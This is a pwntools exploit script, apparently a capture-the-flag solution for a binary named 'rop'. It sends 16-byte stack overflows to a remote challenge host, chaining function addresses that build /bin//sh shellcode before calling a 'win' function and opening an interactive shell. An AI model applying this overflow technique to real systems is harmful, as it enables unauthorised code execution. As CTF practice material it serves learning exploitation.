from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')

tryme = 0x080496ca
win = 0x0804967e
depot = 0x080494b0
# 0x3180cd0b
# or     ecx,ebp
grove = 0x080495e4
# 0x89e3896e
# outs   dx,BYTE PTR ds:[esi]
junction = 0x0804954a
# 0x68732f2f
# das
lodge = 0x080492e2
# 0xb0c289c1
# ror    DWORD PTR [ecx+0xb0c2],0x0
lake = 0x08049248
# 0x80cd40c0
# rol    BYTE PTR [eax-0x33],0x80
shores = 0x08049416
# 0x69622f68
# push   0x69622f
towers = 0x0804937c
# 0x6850c031
# xor    eax,eax
places = [depot,grove,junction,lodge,lake,shores,towers,win,tryme]

# commands = ['b *0x08049713']+['b *{}'.format(hex(n)) for n in places]
# p = gdb.debug('./rop', '\n'.join(commands)) 
# p = process('./rop')
p = remote('ctf.umbccd.io', 4100)

for place in [towers,junction,shores,grove,lodge,depot]:
    buf = b''
    buf += b'a'*16
    buf += p32(place)
    buf += p32(tryme)
    p.send(buf)

buf = b''
buf += b'a'*16
buf += p32(win)
p.sendline(buf)

p.interactive()
